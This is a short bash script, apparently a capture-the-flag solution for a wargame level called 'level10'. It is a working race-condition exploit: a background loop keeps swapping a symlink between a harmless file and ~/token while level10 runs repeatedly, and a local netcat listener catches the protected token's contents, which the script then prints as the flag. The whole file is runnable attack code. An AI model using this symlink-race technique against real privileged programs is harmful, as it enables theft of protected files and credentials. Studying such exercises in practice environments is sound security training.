#!/bin/bash

# Sky blue color (only for the flag)
CIAN='\033[36m'
NC='\033[0m'

# Preparation
echo "OK" > /tmp/ok
chmod 644 /tmp/ok

# Start toggle in the background
(while true; do ln -sf /tmp/ok /tmp/link; ln -sf ~/token /tmp/link; done) &
TOGGLE_PID=$!

# Exploitation attempts
for i in {1..10}; do
    # Start listener
    nc -l 6969 > /tmp/flag &
    NC_PID=$!
    sleep 0.2
    
    # Run level10 from the correct location
    ./level10 /tmp/link 127.0.0.1
    sleep 0.2
    
    # Search for the flag in the output (ignore banner and OK)
    CONTENT=$(cat /tmp/flag)
    FLAG=$(echo "$CONTENT" | grep -v ".*( )*." | grep -v "OK")
    
    # Show content - highlight only the flag in sky blue if found
    if [ ! -z "$FLAG" ]; then
        echo -n "Content: "
        echo -e "${CIAN}$FLAG${NC}"
        break
    else
        echo "Content: $CONTENT"
    fi
    
    # Clean up for the next attempt
    kill $NC_PID 2>/dev/null
    killall nc 2>/dev/null
done

# Final cleanup
kill $TOGGLE_PID 2>/dev/null